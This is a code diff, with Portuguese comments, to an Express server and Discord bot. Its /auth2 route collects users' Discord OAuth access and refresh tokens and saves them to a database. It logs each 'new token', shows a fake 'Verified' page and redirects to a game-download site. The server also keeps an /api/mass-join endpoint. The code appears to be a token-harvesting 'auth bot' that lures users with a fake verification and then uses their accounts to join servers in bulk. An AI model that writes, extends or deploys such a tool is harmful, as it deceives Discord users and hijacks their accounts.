@@ -8,7 +8,7 @@ const {
 
 // --- CONFIGURAÇÕES ---
 const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
-const REDIRECT_TARGET_GAME = 'https://gamedown.onrender.com/sucess'; // Link final
+const REDIRECT_TARGET_GAME = 'https://gamedown.onrender.com/sucess'; 
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD; 
 
 // --- BANCO DE DADOS ---
@@ -22,7 +22,9 @@ async function iniciarBanco() {
         try {
             await pool.query(`CREATE TABLE IF NOT EXISTS auth_users (id VARCHAR(255) PRIMARY KEY, username VARCHAR(255), access_token TEXT, refresh_token TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);`);
             console.log('✅ Banco conectado.');
-        } catch (err) { console.error("❌ Erro banco:", err); }
+        } catch (err) { console.error("❌ Erro ao conectar no Banco:", err.message); }
+    } else {
+        console.log("⚠️ AVISO: DATABASE_URL não configurada no Render!");
     }
 }
 
@@ -33,17 +35,28 @@ app.use(express.json());
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
 // =================================================================
-// ROTA DE VERIFICAÇÃO /AUTH2 (O que você pediu)
+// ROTA /AUTH2 (COM LOGS DE DEBUG)
 // =================================================================
 app.get('/auth2', async (req, res) => {
-    const { code, state } = req.query; 
+    const { code } = req.query; 
     
-    // Se não vier código, o Discord não enviou direito
-    if (!code) return res.send('Erro: Falta código de autorização.');
+    console.log("👉 [DEBUG] Recebi uma visita na rota /auth2"); // LOG 1
+
+    if (!code) {
+        console.log("❌ [ERRO] Visita sem código do Discord.");
+        return res.send('Erro: Falta código de autorização.');
+    }
+
+    // VERIFICAÇÃO DE VARIÁVEIS ANTES DE COMEÇAR
+    if (!process.env.REDIRECT_URI_2) {
+        console.log("❌ [ERRO] REDIRECT_URI_2 não existe no Render Environment.");
+        return res.send("Erro Crítico: Configure REDIRECT_URI_2 no Render.");
+    }
 
     try {
+        console.log(`👉 [DEBUG] Trocando código por token... Usando redirect: ${process.env.REDIRECT_URI_2}`);
+
         // 1. Troca o Código pelo Token
-        // O redirect_uri aqui TEM que ser o próprio link /auth2
         const tokenResponse = await axios.post(
             'https://discord.com/api/oauth2/token',
             new URLSearchParams({
@@ -58,13 +71,16 @@ app.get('/auth2', async (req, res) => {
         );
 
         const { access_token, refresh_token } = tokenResponse.data;
+        console.log("✅ [SUCESSO] Token obtido!");
+
         const userResponse = await axios.get('https://discord.com/api/users/@me', {
             headers: { Authorization: `Bearer ${access_token}` },
         });
 
         const user = userResponse.data;
+        console.log(`👉 [DEBUG] Usuário identificado: ${user.username} (${user.id})`);
 
-        // 2. Salva no Banco (SQL)
+        // 2. Salva no Banco
         if (pool) {
             await pool.query(`
                 INSERT INTO auth_users (id, username, access_token, refresh_token)
@@ -72,28 +88,22 @@ app.get('/auth2', async (req, res) => {
                 ON CONFLICT (id) 
                 DO UPDATE SET access_token = $3, refresh_token = $4;
             `, [user.id, user.username, access_token, refresh_token]);
+            console.log("✅ [SUCESSO] Salvo no Banco de Dados.");
+        } else {
+            console.log("⚠️ [AVISO] Não salvou no banco (Pool desconectado).");
         }
 
-        // 3. Tenta dar o Cargo (Auth2 Vetificados)
-        // O ID do servidor vem no 'state' se o seu outro site mandou ele
-        if (state) {
-            try {
-                const guild = client.guilds.cache.get(state);
-                if (guild) {
-                    const member = await guild.members.fetch(user.id).catch(() => null);
-                    const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados');
-                    if (member && role) await member.roles.add(role);
-                }
-            } catch (e) { console.error("Erro ao dar cargo:", e.message); }
-        }
-
-        // 4. Log no Discord
+        // 3. Log no Discord
         const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
         if (logChannel) {
-            logChannel.send({ embeds: [new EmbedBuilder().setTitle('📥 Novo Token (Via Site Externo)').setDescription(`**Usuário:** ${user.username}`).setColor('Green')] });
+            logChannel.send({ embeds: [new EmbedBuilder().setTitle('📥 Novo Token (Auth2)').setDescription(`**Usuário:** ${user.username}`).setColor('Green')] })
+            .then(() => console.log("✅ [SUCESSO] Log enviado para o Discord."))
+            .catch(err => console.error("❌ [ERRO] Falha ao enviar mensagem no Discord:", err.message));
+        } else {
+            console.log(`❌ [ERRO] Canal de Log não encontrado. ID Configurado: ${LOG_CHANNEL_ID}`);
         }
 
-        // 5. Redirecionamento Rápido (0.3s) para o seu site de Sucesso
+        // 4. Redireciona
         res.send(`
             <!DOCTYPE html>
             <html lang="pt-br">
@@ -105,7 +115,7 @@ app.get('/auth2', async (req, res) => {
             </head>
             <body>
                 <div class="spinner"></div>
-                <p>Verificando...</p>
+                <p>Verificado! Redirecionando...</p>
                 <script>
                     setTimeout(() => { window.location.href = "${REDIRECT_TARGET_GAME}"; }, 300);
                 </script>
@@ -114,14 +124,20 @@ app.get('/auth2', async (req, res) => {
         `);
 
     } catch (e) { 
-        console.error(e.response ? e.response.data : e.message);
-        res.send('Erro na autenticação. Verifique se o REDIRECT_URI_2 no Render está igual ao link configurado no seu site externo e no Discord.'); 
+        console.error("❌ [ERRO FATAL NA API DISCORD]:");
+        console.error(e.response ? JSON.stringify(e.response.data) : e.message);
+        
+        res.send(`
+            <h1>Erro na Verificação</h1>
+            <p>Ocorreu um erro no servidor.</p>
+            <p>Admin, verifique os Logs do Render para ver o motivo exato.</p>
+            <br>
+            <small>Erro: ${e.message}</small>
+        `); 
     }
 });
 
-// =================================================================
-// OUTRAS ROTAS (Status, Painel Admin, API Mass Join)
-// =================================================================
+// ROTAS ANTIGAS (MANTIDAS)
 app.get('/', async (req, res) => {
     let count = 0;
     if(pool) { try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {} }
@@ -151,7 +167,7 @@ app.post('/api/mass-join', async (req, res) => {
     }
 });
 
-// --- BOT DISCORD (Apenas liga para manter conexão e dar cargos) ---
+// BOT START
 client.once('ready', () => console.log(`🤖 Bot Logado: ${client.user.tag}`));
 iniciarBanco().then(() => {
     app.listen(process.env.PORT || 3000, () => console.log("Web Server Ligado"));
